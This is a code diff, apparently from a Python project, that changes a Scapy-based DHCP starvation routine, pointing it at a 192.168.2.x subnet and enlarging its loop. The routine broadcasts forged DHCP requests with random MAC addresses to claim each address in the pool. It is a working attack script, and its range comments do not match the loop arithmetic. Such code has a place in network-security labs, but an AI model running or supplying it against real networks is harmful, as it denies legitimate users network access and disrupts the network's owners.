@@ -46,10 +46,10 @@ class Storage_DHCP(object):
 # Function for starvation process   
   
     def starvation(self):
-        for i in range(0,182): #Range from 2 till 254
+        for i in range(0,200): #Range from 10 till 254
             if i == 0: 
                 continue
-            req_ip_addr = "192.168.0."+str(9+i)
+            req_ip_addr = "192.168.2."+str(9+i)
             
             #If all IP are registered before already
             
@@ -64,7 +64,7 @@ class Storage_DHCP(object):
             # Layers being defined
             
             hw=spoof_mac
-            pkt = Ether(src=RandMAC(), dst="ff:ff:ff:ff:ff:ff")/ IP(src="0.0.0.0", dst="255.255.255.255")/ UDP(sport=68, dport=67)/BOOTP(chaddr=hw)/DHCP(options=[("message-type", "request"),("requested_addr", req_ip_addr),("server_id", "192.168.0.1"),"end"])
+            pkt = Ether(src=RandMAC(), dst="ff:ff:ff:ff:ff:ff")/ IP(src="0.0.0.0", dst="255.255.255.255")/ UDP(sport=68, dport=67)/BOOTP(chaddr=hw)/DHCP(options=[("message-type", "request"),("requested_addr", req_ip_addr),("server_id", "192.168.2.1"),"end"])
            
             # Packet is sent one by one
            
